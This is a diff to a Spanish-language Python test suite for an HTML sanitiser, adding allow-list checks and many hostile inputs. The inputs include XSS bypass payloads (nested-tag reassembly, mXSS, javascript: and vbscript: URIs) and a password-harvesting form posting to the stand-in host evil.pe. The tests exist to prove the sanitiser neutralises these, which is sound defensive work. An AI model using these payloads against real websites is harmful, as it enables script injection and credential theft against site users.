@@ -1,6 +1,23 @@
 import unittest
 
+from html.parser import HTMLParser
+
 from cero.saneado import sanear_html, sanear_nombre, sanear_texto
+
+PERMITIDAS = {"p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "br", "code", "pre",
+              "blockquote", "div", "span"}
+
+
+def marcado(html):
+    vistas = []
+
+    class Lector(HTMLParser):
+        def handle_starttag(self, etiqueta, atributos):
+            vistas.append((etiqueta, atributos))
+    lector = Lector()
+    lector.feed(html)
+    lector.close()
+    return vistas
 
 ATAQUES = [
     "<script>alert(1)</script>",
@@ -31,6 +48,29 @@ ATAQUES = [
     "<svg><style><img src=x onerror=alert(1)></style></svg>",
     "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
     "<a href=\"javascript&colon;alert(1)\">x</a>",
+    "<<b></b>script>alert(1)<<b></b>/script>",
+    "<<b>img src=x onerror=alert(1)>",
+    "<<script>script>alert(1)<</script>/script>",
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+]
+
+ABUSOS = [
+    ("<form action=\"https://evil.pe\"><input type=password name=clave></form>",
+     ("<form", "<input", "action=", "name=")),
+    ("<button form=login formaction=\"https://evil.pe\">ok</button>",
+     ("<button", "formaction", "form=")),
+    ("<img name=getElementById src=x>", ("<img", "name=")),
+    ("<p id=config name=x>hola</p>", ("id=", "name=")),
+    ("<div style=\"position:fixed;top:0;left:0;width:100%\">x</div>", ("style=",)),
+    ("<p style=\"width:expression(alert(1))\">x</p>", ("style=", "expression")),
+    ("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>", ("data:", "href=")),
+    ("<a href=\"data:image/svg+xml,<svg onload=alert(1)>\">x</a>", ("data:", "href=", "<svg")),
+    ("<p srcdoc=\"<script>alert(1)</script>\">x</p>", ("srcdoc", "script")),
+    ("<svg><a href=\"https://x.pe\"><text>x</text></a></svg>", ("<svg", "<a", "<text", ">x<")),
+    ("<math><mi>secreto</mi></math>", ("<math", "secreto")),
+    ("<template><p>dentro</p></template>", ("<template", "dentro")),
+    ("<a href=\"vbscript:msgbox(1)\">x</a>", ("vbscript", "href=")),
+    ("<a href=\"ftp://x.pe\">x</a>", ("ftp", "href=")),
 ]
 
 
@@ -48,30 +88,51 @@ class SaneadoHtml(unittest.TestCase):
     def test_seg_023_ninguna_variante_deja_algo_ejecutable(self):
         for ataque in ATAQUES:
             with self.subTest(ataque=ataque):
-                limpio = sanear_html(ataque).lower()
-                for rastro in ("<script", "<iframe", "<style", "<object", "<embed", "<noscript",
-                               "onerror", "onload", "onclick", "javascript:", "xlink"):
+                limpio = sanear_html(ataque)
+                for etiqueta, atributos in marcado(limpio):
+                    self.assertIn(etiqueta, PERMITIDAS)
+                    for nombre, valor in atributos:
+                        self.assertIn((etiqueta, nombre), {("a", "href"), ("a", "title")})
+                        if nombre == "href":
+                            self.assertRegex(valor, r"^(https?:|mailto:|[^:]*$)")
+                self.assertNotRegex(limpio, r"<(?!/?(" + "|".join(PERMITIDAS) + r")[ >/])")
+
+    def test_seg_023_solo_pasa_lo_que_esta_en_la_lista(self):
+        for abuso, rastros in ABUSOS:
+            with self.subTest(abuso=abuso):
+                limpio = sanear_html(abuso).lower()
+                for rastro in rastros:
                     self.assertNotIn(rastro, limpio)
+
+    def test_seg_024_los_enlaces_seguros_se_quedan(self):
+        for href in ("https://x.pe/a", "http://x.pe", "mailto:ana@x.pe", "/relativo", "otra.html",
+                     "#ancla", "?q=1"):
+            with self.subTest(href=href):
+                html = f'<a href="{href}">x</a>'
+                self.assertEqual(sanear_html(html), html)
 
     def test_seg_024_conserva_el_marcado_inocuo(self):
         for inocuo in ("<p><b>hola</b></p>",
                        "<ul><li>uno</li><li><i>dos</i></li></ul>",
                        "<a href=\"https://x.pe/?a=1&amp;b=2\" title=\"t\">enlace</a>",
                        "uno<br>dos",
+                       "<blockquote><p><em>a</em> <strong>b</strong></p></blockquote>",
+                       "<pre><code>x = 1</code></pre>",
+                       "<ol><li>uno</li></ol><div><span>x</span></div>",
                        "a &amp; b &lt; c",
                        "texto sin marcado"):
             with self.subTest(inocuo=inocuo):
                 self.assertEqual(sanear_html(inocuo), inocuo)
 
     def test_seg_024_de_la_etiqueta_peligrosa_solo_quita_lo_peligroso(self):
-        self.assertEqual(sanear_html("<img src=\"a.png\" onerror=\"x()\" alt=\"a\">"),
-                         "<img src=\"a.png\" alt=\"a\">")
+        self.assertEqual(sanear_html("<p onclick=\"x()\" class=\"c\">hola</p>"), "<p>hola</p>")
+        self.assertEqual(sanear_html("<section><h1>t</h1><p>x</p></section>"), "t<p>x</p>")
         self.assertEqual(sanear_html("<a href=\"javascript:x()\" title=\"t\">y</a>"),
                          "<a title=\"t\">y</a>")
 
     def test_el_texto_que_parece_marcado_sale_escapado(self):
-        self.assertEqual(sanear_html("<p title='\"><script>'>x</p>"),
-                         "<p title=\"&quot;&gt;&lt;script&gt;\">x</p>")
+        self.assertEqual(sanear_html("<a title='\"><script>'>x</a>"),
+                         "<a title=\"&quot;&gt;&lt;script&gt;\">x</a>")
 
 
 class SaneadoTexto(unittest.TestCase):
@@ -89,8 +150,14 @@ class SaneadoTexto(unittest.TestCase):
             with self.subTest(ataque=ataque):
                 self.assertNotIn("<", sanear_texto(ataque))
 
-    def test_el_texto_sale_como_texto(self):
-        self.assertEqual(sanear_texto("a &amp; b"), "a & b")
+    def test_seg_025_lo_que_queda_no_se_vuelve_a_juntar_en_etiquetas(self):
+        self.assertEqual(sanear_texto("<<b></b>script>alert(1)<<b></b>/script>"),
+                         "&lt;script&gt;alert(1)&lt;/script&gt;")
+        self.assertEqual(sanear_texto("&lt;script&gt;x&lt;/script&gt;"),
+                         "&lt;script&gt;x&lt;/script&gt;")
+
+    def test_el_texto_sale_escapado(self):
+        self.assertEqual(sanear_texto("a &amp; b > c"), "a &amp; b &gt; c")
 
 
 class SaneadoNombre(unittest.TestCase):
